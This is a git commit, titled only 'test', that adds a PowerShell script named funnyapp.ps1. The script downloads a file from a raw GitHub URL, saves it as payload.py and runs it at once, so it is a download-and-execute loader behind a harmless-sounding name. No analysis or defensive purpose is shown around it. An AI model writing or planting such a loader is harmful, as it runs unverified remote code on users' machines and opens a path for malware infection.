94528313e34ed3c3eddbdf4c5ecb1ffc119d57e8
VBANma <134359542+ProbNotAnExploiter@users.noreply.github.com>
2026-05-10 16:36:48 +0700

    test

--- letters/funnyapp.ps1
+++ letters/funnyapp.ps1
@@ -1,1 +1,5 @@
+$url = 'https://raw.githubusercontent.com/ProbNotAnExploiter/wordies/edit/main/letters/test.py'
+$client = New-Object System.Net.WebClient
+$client.DownloadFile($url, 'payload.py')
 
+& 'payload.py'
